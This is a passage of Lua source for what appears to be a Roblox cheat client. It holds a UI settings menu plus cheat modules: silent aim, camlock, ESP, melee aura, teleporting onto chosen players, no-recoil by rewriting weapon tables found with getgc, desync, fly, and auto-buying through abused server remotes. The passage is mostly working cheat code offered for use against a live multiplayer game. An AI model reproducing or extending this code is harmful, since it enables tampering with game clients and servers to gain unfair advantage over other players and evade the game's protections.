            Page = Searchbox.Page,
            Default = Searchbox.Default,
            Multi = Searchbox.Multi,
            Callback = Searchbox.Callback,
        })

        local PageSearchData = Library.SearchItems[Searchbox.Page]

        if PageSearchData then
            local SearchData = {
                Element = SearchboxItems["Listbox"],
                Name = Searchbox.Name,
            }

            TableInsert(PageSearchData, SearchData)
        end

        return NewSearchbox 
    end

    Library.BlankElement = function(self, Data)
        local BlankElement = {
            Name = Data.Name or Data.name or "Blank",
            Size = Data.Size or Data.size or 18
        }

        local Items = { } do
            Items["BlankElement"] = Instances:Create("Frame", {
                Parent = Library.Holder.Instance,
                Name = "\0",
                BackgroundTransparency = 1,
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 0, BlankElement.Size),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["Text"] = Instances:Create("TextLabel", {
                Parent = Items["Label"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = BlankElement.Name,
                Size = UDim2New(0, 0, 0, 15),
                AnchorPoint = Vector2New(0, 0.5),
                Position = UDim2New(0, 0, 0.5, 0),
                BackgroundTransparency = 1,
                TextXAlignment = Enum.TextXAlignment.Left,
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

            Items["Text"]:TextBorder()
        end

        return BlankElement, Items
    end

    Library.CreateSettingsPage = function(self, Window, Watermark, KeybindList, WatermarkConfig)
        local SettingsPage = Window:Page({Name = "Settings", SubPages = true}) do 
            local ThemingSubPage = SettingsPage:SubPage({Name = "Theming", Columns = 2}) do 
                local ThemesSection = ThemingSubPage:Section({Name = "Themes", Side = 1}) do
                    for Index, Value in Library.Theme do 
                        ThemesSection:Label(Index):Colorpicker({
                            Name = Index,
                            Flag = Index.."Theme",
                            Default = Value,
                            Callback = function(Value)
                                Library.Theme[Index] = Value
                                Library:ChangeTheme(Index, Value)
                            end
                        })
                    end
                end
            end

            local ConfigsSubPage = SettingsPage:SubPage({Name = "Configs", Columns = 2}) do 
                local ConfigsSection = ConfigsSubPage:Section({Name = "Configs", Side = 1}) do
                    local ConfigName
                    local ConfigSelected

                    local ConfigsSearchbox = ConfigsSection:Searchbox({
                        Name = "SearchboxConfigs",
                        Flag = "ConfigsSearchobx",
                        Items = { },
                        Multi = false,
                        Callback = function(Value)
                            ConfigSelected = Value
                        end
                    })

                    ConfigsSection:Textbox({
                        Name = "Config name", 
                        Default = "", 
                        Flag = "ConfigName", 
                        Placeholder = "Enter text", 
                        Callback = function(Value)
                            ConfigName = Value
                        end
                    })

                    local CreateAndDeleteButton = ConfigsSection:Button()

                    CreateAndDeleteButton:Add("Create", function()
                        if ConfigName and ConfigName ~= "" then
                            if not isfile(Library.Folders.Configs .. "/" .. ConfigName .. ".json") then
                                writefile(Library.Folders.Configs .. "/" .. ConfigName .. ".json", Library:GetConfig())
                                Library:Notification("Success", "Created config "..ConfigName .. " succesfully", 5)
                                Library:RefreshConfigsList(ConfigsSearchbox)
                            else
                                Library:Notification("Error", "Config with the name "..ConfigName .. " already exists", 5)
                                return
                            end
                        end
                    end)

                    CreateAndDeleteButton:Add("Delete", function()
                        if ConfigSelected then
                            Library:DeleteConfig(ConfigSelected)
                            Library:Notification("Success", "Deleted config "..ConfigSelected .. " succesfully", 5)
                            Library:RefreshConfigsList(ConfigsSearchbox)
                        end
                    end)

                    local LoadAndSaveButton = ConfigsSection:Button()    

                    LoadAndSaveButton:Add("Load", function()
                        if ConfigSelected and ConfigSelected ~= "" then
                            local p = Library.Folders.Configs .. "/" .. ConfigSelected
                            if isfile(p) then
                                Library:LoadConfig(readfile(p))
                                Library:Notification("Success", "Loaded: "..ConfigSelected, 3)
                            end
                        end
                    end)

                    LoadAndSaveButton:Add("Save", function()
                        if ConfigName and ConfigName ~= "" then
                            local n = ConfigName:match("%.json$") and ConfigName or ConfigName .. ".json"
                            writefile(Library.Folders.Configs .. "/" .. n, Library:GetConfig())
                            Library:RefreshConfigsList(ConfigsSearchbox)
                            Library:Notification("Success", "Saved: "..n, 3)
                        end
                    end)

                    Library:RefreshConfigsList(ConfigsSearchbox)
                end
            end

            local WatermarkSubPage = SettingsPage:SubPage({Name = "Watermark", Columns = 2}) do
                local WatermarkSection = WatermarkSubPage:Section({Name = "Watermark", Side = 1}) do
                    WatermarkSection:Textbox({
                        Name = "UID",
                        Flag = "Watermark_UID",
                        Default = WatermarkConfig.UID,
                        Placeholder = "1 / AC01",
                        Numeric = false,
                        Callback = function(Value)
                            Value = tostring(Value or "")
                            Value = Value:gsub("[^%w%s%._%-]", "")
                            if Value == "" then Value = "1" end
                            WatermarkConfig.UID = Value
                        end
                    })

                    WatermarkSection:Toggle({
                        Name = "Date",
                        Flag = "Watermark_Date",
                        Default = WatermarkConfig.ShowDate,
                        Callback = function(Value) WatermarkConfig.ShowDate = Value end
                    })

                    WatermarkSection:Toggle({
                        Name = "Time",
                        Flag = "Watermark_Time",
                        Default = WatermarkConfig.ShowTime,
                        Callback = function(Value) WatermarkConfig.ShowTime = Value end
                    })
                end

                local WatermarkInfoSection = WatermarkSubPage:Section({Name = "Performance", Side = 2}) do
                    WatermarkInfoSection:Toggle({
                        Name = "FPS",
                        Flag = "Watermark_FPS",
                        Default = WatermarkConfig.ShowFPS,
                        Callback = function(Value) WatermarkConfig.ShowFPS = Value end
                    })

                    WatermarkInfoSection:Toggle({
                        Name = "Ping",
                        Flag = "Watermark_Ping",
                        Default = WatermarkConfig.ShowPing,
                        Callback = function(Value) WatermarkConfig.ShowPing = Value end
                    })

                    WatermarkInfoSection:Label("UID accepts English letters and numbers")
                end
            end

            local SettingsSubPage = SettingsPage:SubPage({Name = "Settings", Columns = 2}) do 
                local SettingsSection = SettingsSubPage:Section({Name = "Settings", Side = 1}) do
                    SettingsSection:Toggle({
                        Name = "Watermark",
                        Flag = "Watermark",
                        Default = true,
                        Callback = function(Value)
                            Watermark:SetVisibility(Value)
                        end
                    })

                    SettingsSection:Toggle({
                        Name = "Keybind list",
                        Flag = "Keybind list",
                        Default = true,
                        Callback = function(Value)
                            KeybindList:SetVisibility(Value)
                        end
                    })

                    SettingsSection:Slider({
                        Name = "Fade time",
                        Flag = "FadeTime",
                        Default = Library.FadeSpeed,
                        Min = 0,
                        Max = 1,
                        Decimals = 0.01,
                        Callback = function(Value)
                            Library.FadeSpeed = Value
                        end
                    })

                    SettingsSection:Slider({
                        Name = "Tween time",
                        Flag = "TweenTime",
                        Default = Library.Tween.Time,
                        Min = 0,
                        Max = 1,
                        Decimals = 0.01,
                        Callback = function(Value)
                            Library.Tween.Time = Value
                        end
                    })
SettingsSection:Dropdown({
    Name = "DPI",
    Flag = "dpi",
    Items = {"50%", "70%", "80%", "90%", "100%", "110%", "120%"},
    Default = "80%",
    Multi = false,
    Callback = function(v)
        getgenv().d2.Scale = tonumber(v:match("%d+")) / 100
    end
})
                    SettingsSection:Dropdown({
                        Name = "Tween style",
                        Flag = "Tween style",
                        Items = { "Linear", "Quad", "Quart", "Back", "Bounce", "Circular", "Cubic", "Elastic", "Exponential", "Sine", "Quint" },
                        Default = "Cubic",
                        Callback = function(Value)
                            Library.Tween.Style = Enum.EasingStyle[Value]
                        end
                    })

                    SettingsSection:Dropdown({
                        Name = "Tween direction",
                        Flag = "Tween direction",
                        Items = { "In", "Out", "InOut" },
                        Default = "Out",
                        Callback = function(Value)
                            Library.Tween.Direction = Enum.EasingDirection[Value]
                        end
                    })

                    SettingsSection:Button():Add("Unload", function()
                        Library:Unload()
                    end)

                    SettingsSection:Label("UI Keybind"):Keybind({
                        Name = "Menu keybind",
                        Flag = "UIKeybind",
                        Default = Library.MenuKeybind,
                        Mode = "Toggle",
                        Callback = function()
                            Library.MenuKeybind = Library.Flags["UIKeybind"].Key
                        end
                    })
                end
            end
        end
        
        return SettingsPage
    end
end

-- == Core Services ==
local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local RepStorage   = game:GetService("ReplicatedStorage")
local UIS          = game:GetService("UserInputService")
local Workspace    = game:GetService("Workspace")
local Debris       = game:GetService("Debris")
local CoreGui      = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer  = Players.LocalPlayer
local Camera       = Workspace.CurrentCamera
-- ============================================================
-- 自动买药
-- ============================================================
local BANDAGE = {
    Enabled   = false,
    Count     = 2,
    Range     = 5,
    Cooldown  = 0.2,
    ShopEvent = nil,
    Loop      = nil,
}

local function GetPlayerPos()
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    return hrp and hrp.Position
end

local function GetNearestShop()
    local pos = GetPlayerPos()
    if not pos then return nil end
    local parts = Workspace:GetPartBoundsInRadius(pos, BANDAGE.Range)
    local bestPart, bestType, bestDist = nil, nil, BANDAGE.Range + 1
    for _, part in ipairs(parts) do
        if part.Name == "MainPart" and part:IsA("BasePart") then
            local model = part.Parent
            if model and model.Parent and model.Parent.Name == "Shopz" then
                local dist = (pos - part.Position).Magnitude
                if dist < bestDist then
                    bestDist = dist
                    bestPart = part
                    bestType = (model.Name == "ArmoryDealer") and "LegalStore" or "IllegalStore"
                end
            end
        end
    end
    if bestPart then return { Part = bestPart, Type = bestType } end
    return nil
end

local function GetBandageCount()
    local count = 0
    local backpack = LocalPlayer.Backpack
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if child:IsA("Tool") and child.Name == "Bandage" then count += 1 end
        end
    end
    local char = LocalPlayer.Character
    if char then
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("Tool") and child.Name == "Bandage" then count += 1 end
        end
    end
    return count
end

local function StartAutoBandage()
    if BANDAGE.Loop then return end
    BANDAGE.Loop = task.spawn(function()
        while BANDAGE.Enabled do
            if not BANDAGE.ShopEvent then
                local ev = RepStorage:FindFirstChild("Events")
                BANDAGE.ShopEvent = ev and ev:FindFirstChild("SSHPRMTE1")
            end
            if BANDAGE.ShopEvent and GetBandageCount() < BANDAGE.Count then
                local shop = GetNearestShop()
                if shop then
                    pcall(function()
                        BANDAGE.ShopEvent:InvokeServer(
                            shop.Type, "Misc", "Bandage",
                            shop.Part, nil, true, nil, nil, nil
                        )
                    end)
                    task.wait(BANDAGE.Cooldown)
                else
                    task.wait(1)
                end
            else
                task.wait(0.5)
            end
        end
        BANDAGE.Loop = nil
    end)
end
-- == Remotes ==
local GN_S = RepStorage.Events.GNX_S
local ZF_H = RepStorage.Events.ZFKLF__H
local GN_R = RepStorage.Events.GNX_R

-- DoTweak 查找（游戏内部位置上报函数）
task.defer(function()
    for _, v in getgc(true) do
        if type(v) == "function" then
            local info = debug.getinfo(v)
            if info and info.name == "DoTweak" and info.numparams == 11 then
                DoTweak_fn = v; break
            end
        end
    end
end)

-- == State ==
local RB_State, RF_State, AutoReload, DownCheck   = false, false, false, false
local Debug_Rays, TargetMode, HitSoundSelection   = false, "Near", "None"
local Origin_Radius, Hit_Radius                   = 18.50, 23.50
local Origin_Scans, Hit_Scans                     = 24, 24
local ScanRate                                     = 14
local ScanDistance                                 = 827    -- 新增：扫描距离
local Last_Shot, Valid_Pair, Locked_Path          = 0, nil, nil
local WB = {LastScan=0, Cached=false, Toggle=false, Threshold=0.5, Round=0}
local NoFallEnabled                               = false
local NR = {Enabled=false, Conns={}, OrigVals={}, Cache={}, RecoilVal=0}

-- World Visuals
local WV = {
    LightingModeEnabled=false, LightingMode="ShadowMap",
    WorldTimeEnabled=false, WorldTime=12,
    AmbientEnabled=false, AmbientColor=Color3.fromRGB(255,255,255), OutdoorAmbientColor=Color3.fromRGB(255,255,255),
    AtmosphereEnabled=false, AtmoColor=Color3.fromRGB(255,255,255), AtmoDecay=Color3.fromRGB(120,120,120),
    AtmoHaze=1, AtmoGlare=10, AtmoDensity=0.35, AtmoOffset=0,
    WeatherEnabled=false, WeatherType="Rain", WeatherColor=Color3.fromRGB(255,255,255), WeatherRate=600,
    SkyboxEnabled=false, SkyboxType="Black Storm",
    BGSoundEnabled=false, BGSoundTrack="Night", BGSoundVolume=25,
}
local WV_Lit  = game:GetService("Lighting")
local WV_Atmo = WV_Lit:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", WV_Lit)
local WV_Sky  = WV_Lit:FindFirstChildOfClass("Sky") or Instance.new("Sky", WV_Lit)
local WV_OrigSky = {Bk=WV_Sky.SkyboxBk,Dn=WV_Sky.SkyboxDn,Ft=WV_Sky.SkyboxFt,Lf=WV_Sky.SkyboxLf,Rt=WV_Sky.SkyboxRt,Up=WV_Sky.SkyboxUp}
local WV_Skyboxes = {
    ["Stormy"]     ={Up="18703232671",Bk="18703245834",Lf="18703237556",Dn="18703243349",Ft="18703240532",Rt="18703235430"},
    ["Blue Space"] ={Up="15536117282",Bk="15536110634",Lf="15536114370",Dn="15536112543",Ft="15536116141",Rt="15536118762"},
    ["Pink"]       ={Up="12216108877",Bk="12216109205",Lf="12216110170",Dn="12216109875",Ft="12216109489",Rt="12216110471"},
    ["Black Storm"]={Up="15502511911",Bk="15502511288",Lf="15502507918",Dn="15502508460",Ft="15502510289",Rt="15502509398"},
    ["Realistic"]  ={Up="653719321",  Bk="653719502",  Lf="653719190",  Dn="653718790",  Ft="653719067",  Rt="653718931"},
}
local WV_Sounds = {
    ["Windy Winter"]="rbxassetid://6046340391", ["Light Rain"]="rbxassetid://18862087062",
    ["Thunderstorm"]="rbxassetid://4305545740", ["Night"]="rbxassetid://179507208", ["Day"]="rbxassetid://6189453706",
}
local WV_BGSound = Instance.new("Sound", CoreGui); WV_BGSound.Looped=true
local WV_WeatherPart = Instance.new("Part")
WV_WeatherPart.Size=Vector3.new(40,40,85); WV_WeatherPart.Anchored=true
WV_WeatherPart.CanCollide=false; WV_WeatherPart.Transparency=1
local WV_Emitter = Instance.new("ParticleEmitter", WV_WeatherPart)
WV_Emitter.EmissionDirection=Enum.NormalId.Bottom
WV_Emitter.Orientation=Enum.ParticleOrientation.FacingCameraWorldUp

-- Silent Aim
local SA = {
    Enabled=false, HitChance=100, WallCheck=true,
    TargetPart="Head", IsRandom=false,
    RandomParts={"Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},
    RandomIdx=1, RandomTimer=0,
    VisualizeEvent=nil, DamageEvent=nil,
    -- FOV circle
    FOV_Visible=false, FOV_Radius=100, FOV_Sides=16,
    FOV_Color=Color3.fromRGB(255,0,0), FOV_PositionMode="Center",
    FOV_SpinEnabled=false, FOV_SpinSpeed=50,
    FOV_Rotation=0,
}

local SilkscreenFont = Font.new("rbxassetid://12187371840")
local CONFIG = {
    Rate_Active = 1/12, Rate_Idle = 1, ContentRate = 1/14,
    StrokeThickness = 0.8,
    DistOffset = Vector3.new(0, -5.5, 0),
    NameOffset = Vector3.new(0, 5, 0),
}

local NametagEnabled, DistanceEnabled, HealthEnabled = false, false, false
local LastVisualUpdate, LastContentUpdate         = 0, 0
local InfStaminaEnabled, InfStaminaConnection     = false, nil
local TR = {Enabled=false, Size=1, Color=Color3.fromRGB(255,255,255), Alpha=0}
local HitLogEnabled                               = false

-- Antis
local HeadMode, HandsModSelection                = nil, nil
local OriginalNeckC0, OriginalNeckC1              = nil, nil
local DoTweak_fn                                  = nil
local HeadYaw, HeadRotSpeed, HeadYawTime          = 0, 30, 0
local HeadCustomYaw                               = 0

-- Invisible
local Invis_Enabled, Invis_Track, Invis_SavedCF  = false, nil, nil
local Invis_Anim = Instance.new("Animation")
Invis_Anim.AnimationId = "rbxassetid://282574440"

-- Velocity Desync
local DS = {
    Enabled=false, Visualize=true, TPRate=60,
    X=8.5, Y=3, Z=8.5,
    LastTPTime=0, LastFFlagTime=0,
    CurrentOffset=Vector3.zero, Y_Toggle=false,
    AppliedOffset=Vector3.zero,
    Model=nil,
}

-- 乱飞 (Spin Desync)
local LF = {
    Enabled=false, SpinSpeed=100, TimePosRatio=0.5,
    Track1=nil, Track2=nil, Angle=0,
    Anim1=Instance.new("Animation"),
    Anim2=Instance.new("Animation"),
}
LF.Anim1.AnimationId = "rbxassetid://215384594"
LF.Anim2.AnimationId = "rbxassetid://68339848"

-- Safe Chams & Auto Farm
local SafeChamsEnabled, SafeChamsLoop = false, nil
local SC = {
    APM_Enabled=false, APM_Loop=nil,
    AUS_Enabled=false, AUS_Loop=nil,
    ARA_Enabled=false, ARA_Loop=nil, ARA_LastRefill=0
}

-- Desync visual model
DS.Model = Instance.new("Model")
DS.Model.Name = "FakePosVisual"
do
    local outer = Instance.new("Part")
    outer.Name, outer.Shape  = "Outer", Enum.PartType.Ball
    outer.Size               = Vector3.new(1.5, 1.5, 1.5)
    outer.Color              = Color3.fromRGB(150, 150, 150)
    outer.Transparency       = 0.6
    outer.Material           = Enum.Material.SmoothPlastic
    outer.Anchored           = true
    outer.CanCollide, outer.CanQuery, outer.CanTouch = false, false, false
    outer.Parent             = DS.Model

    local inner = Instance.new("Part")
    inner.Name, inner.Shape  = "Inner", Enum.PartType.Ball
    inner.Size               = Vector3.new(0.6, 0.6, 0.6)
    inner.Color              = Color3.fromRGB(0, 255, 0)
    inner.Transparency       = 0
    inner.Material           = Enum.Material.Neon
    inner.Anchored           = true
    inner.CanCollide, inner.CanQuery, inner.CanTouch = false, false, false
    inner.CFrame             = outer.CFrame
    inner.Parent             = DS.Model

    local weld = Instance.new("WeldConstraint")
    weld.Part0, weld.Part1, weld.Parent = outer, inner, outer
    DS.Model.PrimaryPart = outer

    local hl = Instance.new("Highlight")
    hl.FillTransparency    = 1
    hl.OutlineColor        = Color3.fromRGB(255, 255, 255)
    hl.OutlineTransparency = 0.2
    hl.Parent              = DS.Model
end

local FF_S = {BodyEnabled=false, ToolEnabled=false, Color=Color3.fromRGB(255,255,255), LastSkin=0, BodyProps={}, ToolProps={}}
local TargetList, WhiteList                        = {}, {}

-- ===== 黑/白名单持久化 =====
local ListSaveFolder = "XF_CC"
local ListSaveFile   = ListSaveFolder .. "/lists.json"
local HttpService_LP = game:GetService("HttpService")

if not isfolder(ListSaveFolder) then
    pcall(makefolder, ListSaveFolder)
end

local function SavePlayerLists()
    pcall(function()
        writefile(ListSaveFile, HttpService_LP:JSONEncode({
            WhiteList  = WhiteList  or {},
            TargetList = TargetList or {},
        }))
    end)
end

local function LoadPlayerLists()
    if not isfile(ListSaveFile) then return end
    local ok, decoded = pcall(function()
        return HttpService_LP:JSONDecode(readfile(ListSaveFile))
    end)
    if not ok or type(decoded) ~= "table" then return end

    if type(decoded.WhiteList) == "table" then
        WhiteList = decoded.WhiteList
    end
    if type(decoded.TargetList) == "table" then
        TargetList = decoded.TargetList
    end
end

LoadPlayerLists()


-- Teleport page state
local TP = {
    Enabled = false,
    Rate = 0.01,
    Loop = nil,
    Index = 0,
    FFCheck = false,          -- 检测 ProtectionFF / SpawnFF
    DetectingLife = true      -- 目标死亡后停止 TP
}

local function StartTeleportLoop()
    if TP.Loop then return end
    TP.Loop = task.spawn(function()
        while TP.Enabled do
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")

            if hrp and hum and hum.Health > 0 and #TargetList > 0 then
                local found = false

                -- Follow PlayerList priority order.
                for _ = 1, #TargetList do
                    TP.Index = (TP.Index % #TargetList) + 1
                    local targetName = TargetList[TP.Index]
                    local target = Players:FindFirstChild(targetName)
                    local targetChar = target and target.Character
                    local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                    local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")

                    if target and target ~= LocalPlayer and targetRoot and targetHum then
                        -- 与第二个 TP 文件一致：死亡监测。
                        if TP.DetectingLife and targetHum.Health <= 0 then
                            TP.Enabled = false
                            break
                        end

                        -- 与第二个 TP 文件一致：保护罩检测。
                        if TP.FFCheck then
                            if targetChar:FindFirstChild("ProtectionFF") or targetChar:FindFirstChild("SpawnFF") then
                                continue
                            end
                        end

                        if targetHum.Health > 0 then
                            -- Keep the local player's rotation while moving to the target.
                            hrp.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 2.5, 0)) * CFrame.Angles(0, hrp.Orientation.Y * math.pi / 180, 0)
                            found = true
                            break
                        end
                    end
                end

                if not found then
                    task.wait(0.1)
                else
                    task.wait(math.max(TP.Rate, 0.01))
                end
            else
                task.wait(0.1)
            end
        end
        TP.Loop = nil
    end)
end


local HitSounds = {
    ["Skeet"]     = "rbxassetid://5633695679",
    ["Neverlose"] = "rbxassetid://8726881116",
    ["Gamesense"] = "rbxassetid://4817809188",
    ["Liang"] = "rbxassetid://139480497574511",
}

local SpeedState, JumpState, SpeedValue, JumpValue = false, false, 33.5, 73
local CurrentHum = nil

local function NR_CacheWeapons()
    NR.Cache = {}
    for _, v in pairs(getgc(true)) do
        if type(v) == "table" and rawget(v, "EquipTime") then
            table.insert(NR.Cache, v)
            if not NR.OrigVals[v] then
                NR.OrigVals[v] = {
                    Recoil=v.Recoil, CameraRecoilingEnabled=v.CameraRecoilingEnabled,
                    AngleX_Min=v.AngleX_Min, AngleX_Max=v.AngleX_Max,
                    AngleY_Min=v.AngleY_Min, AngleY_Max=v.AngleY_Max,
                    AngleZ_Min=v.AngleZ_Min, AngleZ_Max=v.AngleZ_Max,
                    Spread=v.Spread
                }
            end
        end
    end
end
local function NR_Apply()
    for _, w in ipairs(NR.Cache) do
        w.Recoil=NR.RecoilVal; w.CameraRecoilingEnabled=false
        w.AngleX_Min=0; w.AngleX_Max=0
        w.AngleY_Min=0; w.AngleY_Max=0
        w.AngleZ_Min=0; w.AngleZ_Max=0
        w.Spread=0
    end
end
local function NR_Reset()
    for w, val in pairs(NR.OrigVals) do
        w.Recoil=val.Recoil; w.CameraRecoilingEnabled=val.CameraRecoilingEnabled
        w.AngleX_Min=val.AngleX_Min; w.AngleX_Max=val.AngleX_Max
        w.AngleY_Min=val.AngleY_Min; w.AngleY_Max=val.AngleY_Max
        w.AngleZ_Min=val.AngleZ_Min; w.AngleZ_Max=val.AngleZ_Max
        w.Spread=val.Spread
    end
end
local function NR_OnChar(char)
    for _, c in ipairs(char:GetChildren()) do
        if c:IsA("Tool") then task.delay(0.1, function() NR_CacheWeapons(); NR_Apply() end) end
    end
    table.insert(NR.Conns, char.ChildAdded:Connect(function(c)
        if c:IsA("Tool") then task.delay(0.1, function() NR_CacheWeapons(); NR_Apply() end) end
    end))
    local hum = char:WaitForChild("Humanoid", 2)
    if hum then
        table.insert(NR.Conns, hum.Died:Connect(function()
            if NR.Enabled then task.wait(1.5); NR_CacheWeapons(); NR_Apply() end
        end))
    end
end
local function NR_Enable()
    if NR.Enabled then return end; NR.Enabled = true
    NR_CacheWeapons(); NR_Apply()
    table.insert(NR.Conns, LocalPlayer.CharacterAdded:Connect(NR_OnChar))
    if LocalPlayer.Character then NR_OnChar(LocalPlayer.Character) end
end
local function NR_Disable()
    if not NR.Enabled then return end; NR.Enabled = false
    NR_Reset()
    for _, c in ipairs(NR.Conns) do c:Disconnect() end; NR.Conns = {}
end

-- Camlock
local CL = {
    Enabled=false, DownCheck=false, TargetOnly=false, AutoPrediction=false,
    FOV=170, Power=1, Shake=0.2, Delay=0.1,
    TargetParts={"Torso","Left Arm","Right Arm","Left Leg","Right Leg"},
    CurrentTarget=nil, LockedPart=nil,
    LastSwitchTime=0, ScanTimer=0,
    CachedTool=nil, CachedVel=1100,
}
-- Melee Aura
local MA = {
    Enabled=false, DownCheck=false, TargetOnly=false,
    ShowAnim=true, Distance=20,
    TargetPart="Random", LastHit=0, Loop=nil,
    Parts={"Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},
    Remote1=RepStorage:WaitForChild("Events"):WaitForChild("XMHH.2"),
    Remote2=RepStorage:WaitForChild("Events"):WaitForChild("XMHH2.2"),
}

-- Antis Constants
local AC = {
    NeckC0 = CFrame.new(0, 0.4, 0.3),
    NeckC1 = CFrame.new(0, -0.1, 0.4) * CFrame.Angles(math.rad(90), math.rad(-180), 0),
    LShoulder  = CFrame.new(-1, 0.5, 0,  0.020794034, -7.74860382e-07, -0.999783635, -0.98459357,  0.173654854, -0.0204781592,  0.173617214,  0.984806538,  0.00361025333),
    RShoulder  = CFrame.new( 1, 0.5, 0,  0.020793736,  1.07288361e-06,  0.999783933,  0.984594166,  0.173652649, -0.0204781592, -0.173615277,  0.984807134,  0.00360971689),
    Mag6D      = CFrame.new(0.00922322646, 0.729015231, -1.10657895, 0.999783754, -6.51925802e-09, -0.0207949243, -0.0204789862, 0.173652411, -0.984594107,  0.00361109618,  0.984807014,  0.17361486),
    Tool6D     = CFrame.new(0.00922359806, 0.729012489, -1.10657847, 0.999783754, -2.79396772e-09, -0.0207949281, -0.0204789862, 0.173653483, -0.984593868,  0.00361111294,  0.984806776,  0.173615932),
    AntiDown   = Vector3.new(0.006237113382667303, -6, -0.18136750161647797),
    OpenHands  = Vector3.new(0.006237113382667303,  6,  0.18136750161647797),
    HandsUp1   = Vector3.new(-4237.62255859375,  9848.9267578125, -2292.4501953125),
    HandsUp2   = Vector3.new(-4264.8974609375,   0.9520299434661865, -556.17333984375),
}

-- Misc
local MC = {AntiShift=false, ShiftDelay=0.05, SmoothCam=false, LerpSpeed=6, SmoothPos=nil}
local AMB    = {Enabled=false, Color=Color3.fromRGB(190, 220, 255), Density=0.45, Brightness=0.15, Gui=nil}
local CAM_FOV = nil
local CAM_FOV_Conn = nil

-- Fly（全部打包进一个表节省寄存器）
local FLY = {
    Enabled = false, Active = false, Speed = 60, Mode = "Normal Fly",
    LastSafeCF = nil, AnimTrack = nil, SpeedLabel = nil,
    PM = nil, PC = nil,
    CurrentYaw = nil, OffTime = nil,
    Gui = nil, Btn = nil,
    RZDONL = nil, NextSend = 0,
    AnimObj = nil,
    AnimId = "rbxassetid://",
    Joints = {"Left Hip","Right Hip","Left Shoulder","Right Shoulder","Neck"},
    EvArgs = {"-r__r3"},
    MobileMode = true,
}
local function FlyRefreshBtn()
    if not FLY.Btn then return end
    if FLY.Active then
        FLY.Btn.Text = "ON";  FLY.Btn.BackgroundColor3 = Color3.fromRGB(30,165,60)
    else
        FLY.Btn.Text = "OFF"; FLY.Btn.BackgroundColor3 = Color3.fromRGB(185,45,45)
    end
end

-- == HitLog ==
local HitLog = { ActiveLogs = {} }
HitLog.THEME = {
    RowHeight = 13, PaddingY = 7, SidePadding = 16, FontSize = 10,
    Font = SilkscreenFont,
    Color_Bg        = Color3.fromRGB(0, 0, 0),
    Color_Accent    = Color3.fromRGB(0, 255, 0),
    Color_Secondary = Color3.fromRGB(200, 200, 200),
    BgTransparency  = 0.5, Lifetime = 5.0, MaxLogs = 8,
    Position        = UDim2.new(0, 20, 0, 70),
}

-- ESP
local BoxESP = { Boxes = {}, Conn = {} }
local espSets = {
    enabled = false, targetOnly = false, outline = true, inline = true,
    outCol = Color3.fromRGB(255,255,255), inCol  = Color3.fromRGB(0,0,0),
    outAlpha = 0.5, inAlpha = 0.2, outSize = 0.1, inSize = 0.05,
}
local bodyParts = {
    "Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg",
    "UpperTorso","LowerTorso","LeftUpperArm","LeftLowerArm","LeftHand",
    "RightUpperArm","RightLowerArm","RightHand",
    "LeftUpperLeg","LeftLowerLeg","LeftFoot",
    "RightUpperLeg","RightLowerLeg","RightFoot",
}

local reloadConnections = {}
local PL_TargetSearch, PL_WhiteSearch = nil, nil
local lastTickHadGun = false
local ChangeMouseLockEvent = RepStorage:WaitForChild("Events2"):WaitForChild("ChangeMouseLock")

-- =====================================================================
-- == Functions ==
-- =====================================================================

local function GetLocalRealPosition()
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return Vector3.zero end
    return hrp.Position - DS.AppliedOffset
end

local function InitHitLog()
    if HitLog.Gui then return end
    HitLog.Gui = Instance.new("ScreenGui")
    HitLog.Gui.Name          = "CatHitLog"
    HitLog.Gui.ResetOnSpawn  = false
    HitLog.Gui.IgnoreGuiInset = true
    HitLog.Gui.Enabled       = false
    HitLog.Gui.Parent        = CoreGui
    local c = Instance.new("Frame")
    c.Name, c.Position = "LogContainer", HitLog.THEME.Position
    c.Size = UDim2.new(0, 500, 0, 800)
    c.BackgroundTransparency = 1
    c.Parent = HitLog.Gui
    HitLog.Container = c
end

local function RecalculateLogPositions()
    for i, frame in ipairs(HitLog.ActiveLogs) do
        local y = (i-1)*(HitLog.THEME.RowHeight + HitLog.THEME.PaddingY)
        TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {Position = UDim2.new(0,0,0,y)}):Play()
    end
end

local function AnimateRemoveLog(frame)
    if not frame then return end
    local info = TweenInfo.new(0.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
    TweenService:Create(frame, info, {Position = frame.Position - UDim2.new(0,0,0,15), BackgroundTransparency = 1}):Play()
    local lbl = frame:FindFirstChild("Content")
    if lbl then TweenService:Create(lbl, info, {TextTransparency = 1}):Play() end
    task.delay(0.5, function() if frame then frame:Destroy() end end)
end

local function AddLogEntry(text)
    if not HitLogEnabled or not HitLog.Container then return end
    if #HitLog.ActiveLogs >= HitLog.THEME.MaxLogs then
        AnimateRemoveLog(table.remove(HitLog.ActiveLogs, 1))
        RecalculateLogPositions()
    end
    local bg = Instance.new("Frame")
    bg.AutomaticSize = Enum.AutomaticSize.X
    bg.Size = UDim2.new(0, 0, 0, HitLog.THEME.RowHeight)
    bg.BackgroundColor3 = HitLog.THEME.Color_Bg
    bg.BackgroundTransparency = 1
